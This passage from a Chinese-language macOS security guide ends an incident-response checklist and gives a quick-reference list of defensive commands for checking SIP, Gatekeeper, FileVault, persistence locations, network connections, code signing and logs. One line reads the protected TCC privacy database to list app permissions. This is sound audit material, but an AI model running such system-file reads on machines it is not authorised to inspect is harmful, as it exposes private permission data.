├─ 建立 IR 工具清单和流程
├─ 定期备份（Time Machine + 云备份）
├─ 制定数据恢复计划
├─ 定期安全审计和渗透测试
└─ 安全意识培训
```

---

## 附录：macOS 安全速查命令

```bash
# === 系统安全状态 ===
csrutil status                                    # SIP 状态
spctl --status                                    # Gatekeeper 状态
fdesetup status                                   # FileVault 状态
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate  # 防火墙状态
sw_vers                                           # 系统版本
softwareupdate --list                             # 可用更新

# === 权限与访问控制 ===
id                                                # 当前用户信息
sudo -l                                           # sudo 权限
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, service, auth_value FROM access;"  # TCC 权限

# === 持久化检查 ===
ls ~/Library/LaunchAgents/                        # 用户级 LaunchAgent
ls /Library/LaunchAgents/                         # 系统级 LaunchAgent
ls /Library/LaunchDaemons/                        # 系统级 LaunchDaemon
crontab -l                                        # 用户 cron
sudo crontab -l                                   # root cron

# === 网络安全 ===
sudo lsof -i -P -n | grep LISTEN                  # 监听端口
sudo lsof -i -P -n | grep ESTABLISHED             # 活动连接
sudo pfctl -s rules                               # pf 规则
netstat -an                                       # 网络连接

# === 代码签名 ===
codesign -dv --verbose=4 /Applications/App.app     # 签名信息
spctl --assess --verbose /Applications/App.app    # Gatekeeper 评估

# === 日志与审计 ===
sudo log show --last 1h --predicate 'process == "sudo"' --info  # sudo 日志
last                                              # 登录历史
sudo log show --last 24h --predicate \
  'subsystem == "com.apple.TCC"' --info          # TCC 变更日志

# === 应急响应 ===
sudo fs_usage -f filesys                          # 文件系统活动
sudo log collect --last 24h --output /tmp/ir.logarchive  # 收集日志
ps aux                                            # 进程列表
```

---

> 本文档持续更新，建议结合实际环境验证命令可用性。macOS 安全机制随版本演进不断变化，请参考 Apple 最新安全文档和 CIS Benchmark 最新版本进行配置。
